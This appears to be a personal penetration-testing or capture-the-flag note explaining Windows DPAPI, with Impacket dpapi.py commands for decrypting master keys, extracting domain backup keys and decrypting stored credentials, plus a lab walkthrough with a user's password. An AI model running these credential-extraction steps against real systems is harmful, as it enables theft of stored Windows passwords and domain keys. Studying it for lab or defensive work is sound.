#creds
The [DPAPI](https://www.passcape.com/index.php?id=28&section=docsys&cmd=details) (Data Protection API) is an internal component in the Windows system. It allows various applications to store sensitive data (e.g. passwords). The data are stored in the users directory and are secured by user-specific master keys derived from the users password. They are usually located at:

```powershell
C:\Users\$USER\AppData\Roaming\Microsoft\Protect\$SUID\$GUID
```

DPAPI-data can be manipulated (mainly offline) with tools like [dpapick](https://github.com/jordanbtucker/dpapick) (Python), [dpapilab](https://github.com/dfirfpi/dpapilab) (Python), [Impacket](https://github.com/SecureAuthCorp/impacket)'s [dpapi.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/dpapi.py) and [secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) (Python).

```bash
# (not tested) Decrypt a master key
dpapi.py masterkey -file "/path/to/masterkey_file" -sid $USER_SID -password $MASTERKEY_PASSWORD

# (not tested) Obtain the backup keys & use it to decrypt a master key
dpapi.py backupkeys -t $DOMAIN/$USER:$PASSWORD@$TARGET
dpapi.py masterkey -file "/path/to/masterkey_file" -pvk "/path/to/backup_key.pvk"

# (not tested) Decrypt DPAPI-protected data using a master key
dpapi.py credential -file "/path/to/protected_file" -key $MASTERKEY
```


Roaming Credentials File:
```powershell
C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9

```

Master key:
```powershell
C:\Users\$USER\AppData\Roaming\Microsoft\Protect\S-1-5-21-...-1107
```

we need to get both in order to decrypt them.

---

1.
```bash
impacket-dpapi masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 -password 'ChefSteph2025!' -sid $SID
```
![[Pasted image 20250711002422.png]]

2.
```bash
impacket-dpapi credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key <the_decreypted_key>
```
![[Pasted image 20250711002813.png]]

